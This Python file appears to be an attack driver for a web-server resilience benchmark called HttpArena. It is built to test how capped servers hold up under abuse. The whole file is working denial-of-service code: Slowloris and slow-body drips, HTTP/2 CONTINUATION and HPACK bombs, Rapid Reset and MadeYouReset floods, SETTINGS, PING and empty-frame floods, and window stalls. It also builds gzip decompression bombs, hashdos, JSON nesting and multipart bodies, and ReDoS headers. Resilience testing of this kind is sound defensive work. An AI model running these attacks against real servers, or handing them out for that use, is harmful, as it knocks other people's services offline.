#!/usr/bin/env python3
"""HttpArena resilience attack driver — adversarial HTTP clients for the
resilience suite. Stdlib only; run on the host (uncapped) against a target
entry running in a memory/CPU-capped container, so what we measure is the
server, not the client.

    attack.py --attack <name> --host H --port P --duration SECS --conns N [opts]

Each attack tries to exhaust one server resource. It prints a one-line JSON
summary of what the *client* did (connections established, how many the server
reaped, bytes sent) to stdout; the runner (scripts/resilience.sh) pairs that
with the server-side signal (peak RSS, OOM-kill, liveness, recovery).

Attacks
  slow-body          N conns POST a large declared Content-Length and then drip
                     the body one byte per interval, never finishing. Tests the
                     body-read timeout / whether the body is buffered whole.
  slow-headers       N conns send a partial header block and keep appending
                     header lines, never sending the terminating CRLF CRLF.
                     Classic Slowloris: header-read timeout / max-conn / header
                     size cap.
  huge-chunk         N conns declare Transfer-Encoding: chunked then announce a
                     chunk of 0x7fffffffffffffff bytes. Tests whether the server
                     pre-allocates the declared chunk buffer (single-request OOM).
  continuation-flood H2(c) conns send HEADERS without END_HEADERS followed by an
                     endless stream of CONTINUATION frames. The server buffers a
                     header block that never ends (CVE-2024-27316). Tests the
                     header-block size cap.

A "reaped" connection is one the server closed on us — which for these attacks
is the *correct* defense (a timeout fired, a cap was enforced). High reaped +
flat server memory = the server defended itself; growing memory / OOM = it did
not.
"""
import argparse
import json
import socket
import ssl
import sys
import threading
import time
import zlib

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


# ── Connection helpers ───────────────────────────────────────────────────────

def _open(host, port, tls, alpn):
    s = socket.create_connection((host, port), timeout=5)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if alpn:
            try:
                ctx.set_alpn_protocols(alpn)
            except NotImplementedError:
                pass
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


# ── Slow engine (slow-body, slow-headers, huge-chunk) ────────────────────────
#
# Open N connections, send a per-attack opener on each, then every interval push
# a tiny "drip" on each still-open connection until the duration runs out. The
# sends are non-blocking: a server that reaps a connection surfaces as an OSError
# we count, not a stall on our side.

def _run_slow(args, opener, dripper, alpn=None):
    deadline = time.monotonic() + args.duration
    conns = []            # [sock, idx, drips]
    established = connect_errors = 0

    for i in range(args.conns):
        if time.monotonic() > deadline:
            break
        try:
            s = _open(args.host, args.port, args.tls, alpn)
            s.sendall(opener(i))
            s.setblocking(False)
            conns.append([s, i, 0])
            established += 1
        except OSError:
            connect_errors += 1

    reaped = sent = 0
    while time.monotonic() < deadline and conns:
        for c in list(conns):
            s, idx, drips = c
            try:
                payload = dripper(idx, drips)
                n = s.send(payload)
                sent += n
                c[2] += 1
            except (BlockingIOError, ssl.SSLWantWriteError, ssl.SSLWantReadError):
                pass
            except OSError:
                reaped += 1
                conns.remove(c)
                try:
                    s.close()
                except OSError:
                    pass
        time.sleep(args.drip_interval)

    open_at_end = len(conns)
    for c in conns:
        try:
            c[0].close()
        except OSError:
            pass
    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
                drip_sent_bytes=sent, connect_errors=connect_errors)


def slow_body(args):
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Content-Length: {args.body_size}\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A" * args.drip_bytes)


def slow_headers(args):
    # GET with no terminating CRLF CRLF; each drip appends another header line,
    # so the request is never complete and the header block keeps growing.
    opener = lambda i: f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
    dripper = lambda i, d: f"X-Pad-{i}-{d}: {'A' * 48}\r\n".encode()
    return _run_slow(args, opener, dripper)


def huge_chunk(args):
    # Declare a chunk of 0x7fffffffffffffff bytes, then drip a little chunk data
    # so a server that waits for the body keeps the (pre-allocated?) buffer.
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"7fffffffffffffff\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A" * args.drip_bytes)


# ── HTTP/2 attack toolkit ────────────────────────────────────────────────────
#
# One shared raw-socket harness backs every H2 attack: preface + empty SETTINGS,
# a frame writer, a tiny HPACK encoder, and a threaded N-connection flood. No h2
# library — the frames are built by hand so we can send exactly the malformed or
# abusive sequence each attack needs.

def _frame(ftype, flags, stream, payload):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + (stream & 0x7FFFFFFF).to_bytes(4, "big") + payload)


def _hpack_int(value, prefix_bits):
    mask = (1 << prefix_bits) - 1
    if value < mask:
        return bytes([value])
    out = bytearray([mask])
    value -= mask
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def _hpack_str(data):
    return _hpack_int(len(data), 7) + data          # Huffman flag off


def _hpack_filler(size):
    """A header block of literal-without-indexing fields with new names, padded
    to `size` — plain bulk, no decompression amplification (continuation-flood)."""
    out = bytearray()
    k = 0
    while len(out) < size:
        name = f"x-{k:x}".encode()
        val = b"a" * 32
        out += b"\x00" + bytes([len(name)]) + name + bytes([len(val)]) + val
        k += 1
    return bytes(out)


def _h2_get_block(authority):
    """A GET / header block: :method/:scheme/:path indexed from the static table,
    :authority literal WITHOUT indexing so the dynamic table stays empty."""
    return bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(authority.encode())


def _h2_get_block_path(authority, path):
    """A GET header block for an arbitrary path: :method/:scheme indexed, :path
    and :authority literal WITHOUT indexing (name indices 4 and 1)."""
    return (bytes([0x82, 0x86, 0x04]) + _hpack_str(path.encode())
            + bytes([0x01]) + _hpack_str(authority.encode()))


def _new_stats():
    return dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)


def _run_workers(n, deadline, worker):
    threads = []
    for _ in range(n):
        if time.monotonic() > deadline:
            break
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=max(0.0, deadline - time.monotonic()) + 5)


def _h2_session(args, stats, lock, body, deadline):
    """Open one H2(c) connection, send the preface + an empty SETTINGS, then run
    body(s, deadline) -> (frames, nbytes) until it returns or the peer drops us."""
    s = None
    try:
        s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
        s.sendall(H2_PREFACE)
        s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
        with lock:
            stats["established"] += 1
        frames, nbytes = body(s, deadline)
        with lock:
            stats["frames_sent"] += frames
            stats["bytes_sent"] += nbytes
    except OSError:
        with lock:
            stats["reaped"] += 1
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def _h2_flood(args, body):
    """N connections, each running body(s, deadline). Shared, locked stats."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()
    _run_workers(args.conns, deadline,
                 lambda: _h2_session(args, stats, lock, body, deadline))
    return stats


def continuation_flood(args):
    # HEADERS (END_STREAM, no END_HEADERS) then an endless stream of CONTINUATION
    # frames that never set END_HEADERS: the server buffers an unbounded header
    # block (CVE-2024-27316).
    initial = _h2_get_block(args.host)
    filler = _hpack_filler(16384)

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
        while time.monotonic() < deadline:
            s.sendall(_frame(0x9, 0x0, 1, filler)); f += 1; nb += len(filler) + 9
        return f, nb

    return _h2_flood(args, body)


def hpack_bomb(args):
    # Insert one ~3.9 KB header into the HPACK dynamic table (literal + incremental
    # indexing -> index 62), then flood CONTINUATION frames of 1-byte indexed
    # references (0xBE) to it. Each byte re-materializes the whole header, so a few
    # KB on the wire decode to hundreds of MB-GB of live header structures.
    big = b"\x40" + _hpack_str(b"x-b") + _hpack_str(b"a" * 3900)
    initial = bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(args.host.encode()) + big
    refs = b"\xBE" * 16384                          # 0x80|62: indexed field, dyn index 62

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
        while time.monotonic() < deadline:
            s.sendall(_frame(0x9, 0x0, 1, refs)); f += 1; nb += len(refs) + 9
        return f, nb

    return _h2_flood(args, body)


def rapid_reset(args):
    # Open a stream (HEADERS, END_STREAM+END_HEADERS) then immediately RST_STREAM
    # (CANCEL) before reading the response, in a tight loop. The slot frees at
    # once so streams are unbounded, while request work keeps piling up
    # (CVE-2023-44487).
    hdr = _h2_get_block(args.host)

    def body(s, deadline):
        f = nb = 0
        sid = 1
        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x3, 0x0, sid, b"\x00\x00\x00\x08")
            s.sendall(buf); f += 1; nb += len(buf); sid += 2
        return f, nb

    return _h2_flood(args, body)


def madeyoureset(args):
    # Like rapid-reset, but the attacker never sends RST: a WINDOW_UPDATE of 0 on
    # the just-opened stream is a protocol error, so the SERVER resets it. Defeats
    # client-RST rate limits (CVE-2025-8671).
    hdr = _h2_get_block(args.host)

    def body(s, deadline):
        f = nb = 0
        sid = 1
        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x8, 0x0, sid, b"\x00\x00\x00\x00")
            s.sendall(buf); f += 1; nb += len(buf); sid += 2
        return f, nb

    return _h2_flood(args, body)


def settings_flood(args):
    # Stream empty SETTINGS frames; the peer must ACK every one (CVE-2019-9515).
    frame = _frame(0x4, 0x0, 0, b"")

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(frame); f += 1; nb += len(frame)
        return f, nb

    return _h2_flood(args, body)


def ping_flood(args):
    # Stream non-ACK PING frames; the peer must PING-ACK every one (CVE-2019-9512).
    frame = _frame(0x6, 0x0, 0, b"\x00" * 8)

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(frame); f += 1; nb += len(frame)
        return f, nb

    return _h2_flood(args, body)


def empty_frame_flood(args):
    # Open a stream, then flood zero-length DATA frames with no END_STREAM: each
    # costs parse + state-machine work but makes no progress (CVE-2019-9518).
    hdr = _h2_get_block(args.host)
    empty = _frame(0x0, 0x0, 1, b"")

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x4, 1, hdr)); f += 1; nb += len(hdr) + 9   # END_HEADERS, stream open
        while time.monotonic() < deadline:
            s.sendall(empty); f += 1; nb += len(empty)
        return f, nb

    return _h2_flood(args, body)


def window_stall(args):
    # Advertise SETTINGS_INITIAL_WINDOW_SIZE = 0, open many streams each requesting
    # a large response, then never send WINDOW_UPDATE. The server generates the
    # responses and buffers data it can never flush (CVE-2019-9517 / CVE-2023-43622).
    settings0 = _frame(0x4, 0, 0, b"\x00\x04\x00\x00\x00\x00")   # INITIAL_WINDOW_SIZE = 0
    block = _h2_get_block_path(args.host, f"/json/{args.stall_count}")

    def body(s, deadline):
        f = nb = 0
        s.sendall(settings0); f += 1; nb += len(settings0)
        sid = 1
        for _ in range(args.stall_streams):
            s.sendall(_frame(0x1, 0x5, sid, block)); f += 1; nb += len(block) + 9
            sid += 2
        # Hold the streams open, never granting window, so the buffered responses
        # are pinned for the server-configured stalled-stream lifetime.
        while time.monotonic() < deadline:
            time.sleep(0.5)
        return f, nb

    return _h2_flood(args, body)


# ── Decompression bomb (HTTP/1.1) ────────────────────────────────────────────

def _gzip_bomb(size):
    """A gzip stream that inflates to `size` zero bytes (built streaming, so the
    client never holds the decompressed form — the output is a few KB-MB)."""
    co = zlib.compressobj(6, zlib.DEFLATED, 16 + 15)    # 16+15 = gzip wrapper
    out = bytearray()
    chunk = b"\x00" * (1 << 20)
    remaining = size
    while remaining > 0:
        n = min(len(chunk), remaining)
        out += co.compress(chunk if n == len(chunk) else chunk[:n])
        remaining -= n
    out += co.flush()
    return bytes(out)


def _h1_request_flood(args, req):
    """N connections each send one fixed HTTP/1.1 request repeatedly until the
    deadline. The shared engine behind every payload/parser attack; `frames_sent`
    counts requests. These are differential: a request only bites a server that
    actually parses the body/headers it targets."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        sent = nb = 0
        s = None
        established = reaped = False
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.settimeout(5)
            established = True
            while time.monotonic() < deadline:
                try:
                    s.sendall(req); sent += 1; nb += len(req)
                    s.recv(65536)
                except socket.timeout:
                    continue
        except OSError:
            reaped = True
        finally:
            with lock:
                if established:
                    stats["established"] += 1
                if reaped:
                    stats["reaped"] += 1
                stats["frames_sent"] += sent
                stats["bytes_sent"] += nb
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


def decompression_bomb(args):
    # POST a small gzip body that inflates to gigabytes. A server that decodes
    # request Content-Encoding before any size check inflates into memory and
    # OOMs; one that does not is a clean "survived".
    bomb = _gzip_bomb(args.bomb_size)
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
    return _h1_request_flood(args, req)


def hashdos(args):
    # A form body of many distinct keys. A server that parses it into a hash map
    # with an un-seeded hash degrades to O(n^2) on insertion (CVE-2011-3414 era).
    body = b"&".join(b"k%d=1" % i for i in range(args.hashdos_keys))
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
    return _h1_request_flood(args, req)


def json_nesting_bomb(args):
    # A tiny, deeply nested JSON array. A recursive-descent parser without a depth
    # cap blows the stack -> process crash (a distinct, non-OOM verdict).
    body = b"[" * args.json_depth + b"]" * args.json_depth
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
    return _h1_request_flood(args, req)


def multipart_flood(args):
    # multipart/form-data with tens of thousands of tiny parts: each part is an
    # allocation + bookkeeping entry, overflowing part/field maps.
    boundary = b"----httparenaResBomb"
    part = (b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="f"\r\n\r\nx\r\n')
    body = part * args.multipart_parts + b"--" + boundary + b"--\r\n"
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n").encode()
           + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
           + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
    return _h1_request_flood(args, req)


def redos_headers(args):
    # Best-effort probe against commonly ReDoS-prone header parsers (Accept,
    # Content-Disposition, Range). A regex that backtracks catastrophically burns
    # a CPU core on one request; RE2/string parsers are immune (a clean survived).
    run = b"a" * args.redos_pad
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"Accept: text/html," + run + b" ;q=0\r\n"
           + b'Content-Disposition: form-data; name="x"; filename="' + run + b'\r\n'
           + b"Range: bytes=" + b",".join(b"0-0" for _ in range(max(1, args.redos_pad // 4))) + b"\r\n"
           + b"Connection: keep-alive\r\n\r\n")
    return _h1_request_flood(args, req)


ATTACKS = {
    "slow-body": slow_body,
    "slow-headers": slow_headers,
    "huge-chunk": huge_chunk,
    "decompression-bomb": decompression_bomb,
    "continuation-flood": continuation_flood,
    "hpack-bomb": hpack_bomb,
    "rapid-reset": rapid_reset,
    "madeyoureset": madeyoureset,
    "settings-flood": settings_flood,
    "ping-flood": ping_flood,
    "empty-frame-flood": empty_frame_flood,
    "window-stall": window_stall,
    "hashdos": hashdos,
    "json-nesting-bomb": json_nesting_bomb,
    "multipart-flood": multipart_flood,
    "redos-headers": redos_headers,
}


def main():
    p = argparse.ArgumentParser(description="HttpArena resilience attack driver")
    p.add_argument("--attack", required=True, choices=sorted(ATTACKS))
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--path", default="/")
    p.add_argument("--conns", type=int, default=1000)
    p.add_argument("--duration", type=float, default=45.0)
    p.add_argument("--drip-interval", type=float, default=1.0, dest="drip_interval")
    p.add_argument("--body-size", type=int, default=10 * 1024 * 1024, dest="body_size")
    p.add_argument("--drip-bytes", type=int, default=1, dest="drip_bytes")
    p.add_argument("--bomb-size", type=int, default=1024 * 1024 * 1024, dest="bomb_size")
    p.add_argument("--hashdos-keys", type=int, default=100000, dest="hashdos_keys")
    p.add_argument("--json-depth", type=int, default=100000, dest="json_depth")
    p.add_argument("--multipart-parts", type=int, default=50000, dest="multipart_parts")
    p.add_argument("--redos-pad", type=int, default=4000, dest="redos_pad")
    p.add_argument("--stall-count", type=int, default=5000, dest="stall_count")
    p.add_argument("--stall-streams", type=int, default=64, dest="stall_streams")
    p.add_argument("--tls", action="store_true")
    args = p.parse_args()

    started = time.monotonic()
    result = ATTACKS[args.attack](args)
    result["attack"] = args.attack
    result["conns_requested"] = args.conns
    result["elapsed_s"] = round(time.monotonic() - started, 2)
    json.dump(result, sys.stdout)
    sys.stdout.write("\n")


if __name__ == "__main__":
    main()
